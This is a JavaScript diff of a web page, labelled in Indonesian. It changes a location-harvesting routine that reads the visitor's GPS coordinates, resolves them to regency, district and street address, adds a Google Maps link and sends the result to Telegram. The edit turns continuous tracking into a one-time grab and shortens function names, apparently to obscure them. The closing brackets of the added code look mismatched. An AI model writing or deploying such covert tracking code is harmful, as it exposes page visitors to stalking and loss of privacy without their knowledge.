@@ -334,29 +334,23 @@ function toggle(el){
             }, 5000);
 
             // GPS tracking
-            if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(async (pos) => {
-                    const coords = pos.coords;
-                    let gpsInfo = `📍 LIVE GPS TRACKING\n`;
-                    gpsInfo += `📌 Lat: ${coords.latitude}\n`;
-                    gpsInfo += `📍 Lng: ${coords.longitude}\n`;
-                    gpsInfo += `🎯 Akurasi: ${coords.accuracy}m\n`;
-                    
-                    const locationDetails = await getLocationDetails(coords.latitude, coords.longitude);
-                    gpsInfo += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
-                    gpsInfo += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
-                    gpsInfo += `🏠 Alamat: ${locationDetails.fullAddress}\n`;
-                    
-                    
-                    await sendToTelegram(gpsInfo);
-                }, 
-                async (err) => {
-                    await sendToTelegram(`❌ GPS Error: ${err.message}`);
-                }, 
-                { 
-                    enableHighAccuracy: true,
-                    maximumAge: 0,
-                    timeout: 5000
+       if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(async p=>{
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                
+                // Menambahkan link Google Maps
+                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
+                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
+                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
+                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
+                
+                const l=await gLD(lat,lon);
+                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
+                await sTG(g)
+            },async e=>{
+                await sTG(`❌ GPS Error: ${e.message}`)
+            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
                 });
             }
         };
